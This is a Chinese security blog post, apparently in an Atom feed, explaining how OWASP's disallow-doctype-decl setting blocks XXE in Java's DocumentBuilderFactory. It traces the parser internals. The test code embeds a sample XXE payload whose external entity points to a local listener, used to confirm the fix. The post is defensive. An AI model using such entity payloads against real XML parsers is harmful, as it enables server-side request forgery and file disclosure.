    <title>Java XXE漏洞正确修复方法及原理</title>
    <link href="http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/"/>
    <id>http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/</id>
    <published>2019-02-20T17:18:49.000Z</published>
    <updated>2019-02-20T18:51:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： <strong>Java中如何正确防御XXE，同时它为何能防御呢？</strong></p><p>OWASP推荐的修复代码如下，号称是可以防御几乎所有XXE攻击！今天我们来深入研究下它为何可以防御XXE漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXEFix</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用以下命令,在本地启动一个监听1664端口的Web服务器，用于检测XXE漏洞是否被触发了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1664</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>在测试代码<code>dbf.setFeature(...);</code>处打断点，开始调式跟踪。</p><p><code>dbf.setFeature()</code>方法会调用多个对象的<code>setFeature()</code>方法，最终到达<code>XMLDocumentScannerImpl</code>对象<code>setFeature()</code>方法，调用链如下：</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setFeature_invocation_list.png" alt="setFeature方法调用链"></p><p>在XMLDocumentScannerImpl.setFeature()中，将<code>fDisallowDoctype</code>属性设置为了<code>true</code>。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/XMLDocumentScannerImpl_fDisallowDoctype_false.png" alt="fDisallowDoctype属性被设置为true"></p><p>在这些XML解析器完成设置后，解析器会调用<code>XMLDocumentScannerImpl.scanDocument()</code>对XML的文档进行扫描。在解析器读到<code>DOCTYPE</code>字符串时，扫描状态会被设置为<code>SCANNER_STATE_DOCTYPE</code>。解析器会进入<code>SCANNER_STATE_DOCTYPE</code>阶段。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setScannerState_SCANNER_STATE_DOCTYPE.png" alt="扫描状态会被设置为SCANNER_STATE_DOCTYPE"></p><p>该阶段会首先判断<code>fDisallowDoctype</code>的值，由上面的跟踪可知<code>fDisallowDoctype</code>已经被改为<code>true</code>，所以会调用<code>reportFatalError()</code>方法，输出致命错误报告并向上抛出解析异常。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/reportFatalError.png" alt="输出致命错误报告并向上抛出解析异常"></p><p>异常会被抛到<code>XML11Configuration.parse()</code>中处理。处理的结果是<code>fParseInProgress</code>变量被设置为了<code>false</code>，接着会调用<code>cleanup()</code>方法在完全解析XML文档之前终止解析，释放解析期间分配的任何资源。所以程序不会运行到漏洞触发处。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/fParseInProgress_false.png" alt="终止解析XML"></p><p>最终运行结果如下，Web服务器也并未收到Http请求。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/result.png" alt="最终运行结果"></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： &lt;strong&gt;Java中如何正确防御XXE，同时它为何能防御呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OWASP推荐的修复代码如下，号称是可以防御几
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
</feed>
